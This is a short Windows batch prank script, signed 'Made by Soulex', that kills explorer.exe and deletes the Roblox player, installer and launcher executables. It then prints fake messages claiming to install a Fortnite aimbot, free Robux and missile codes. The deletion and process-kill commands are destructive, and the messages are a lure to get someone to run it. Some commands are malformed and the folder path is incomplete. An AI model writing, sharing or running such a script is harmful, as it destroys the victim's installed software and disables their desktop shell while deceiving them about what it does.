@echo off
title Made by Soulex
cd C:\Users\AppData\Local\Roblox\Versions

cmd.exe /c "taskkill if  explorer.exe" >nul
cmd.exe /c "powershell del RobloxPlayerBeta.exe" >nul
cmd.exe /c "powershell del RobloxPlayerInstaller.exe" >nul
cmd.exe /c "powershell del RobloxPlayerLauncher.exe" >nul

setlocal

:: Check if explorer.exe is running
tasklist /fi "imagename eq explorer.exe" | find /i "explorer.exe" >nul
if %errorlevel% == 0 (
    echo explorer.exe is running. Killing it now...
    taskkill /f /im explorer.exe
) else (
    echo explorer.exe is not running.
)

endlocal



@echo Deleting Roblox player.

@echo Deleting RobloxPlayerInstaller.exe

@echo Deleting RobloxPlayerLauncher.exe

@echo Installing Fortnite aimbot

@echo Installing Free robux

@echo and north korean missile codes :)


pause